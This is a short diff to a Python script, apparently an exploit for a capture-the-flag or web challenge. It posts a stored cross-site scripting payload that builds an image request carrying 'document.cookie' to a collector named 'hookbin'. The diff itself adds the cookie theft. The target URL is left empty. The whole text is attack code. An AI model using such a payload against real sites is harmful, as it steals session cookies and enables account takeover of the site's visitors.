@@ -1,5 +1,5 @@
 import requests
 
 url = ""
-hookbin = "'?c='//" 
-r = requests.post(url, data = {"content[]"k : ";new Image().src" + hookbin})
+hookbin = "'?c='+document.cookie//" 
+r = requests.post(url, data = {"content[]" : ";new Image().src=" + hookbin})
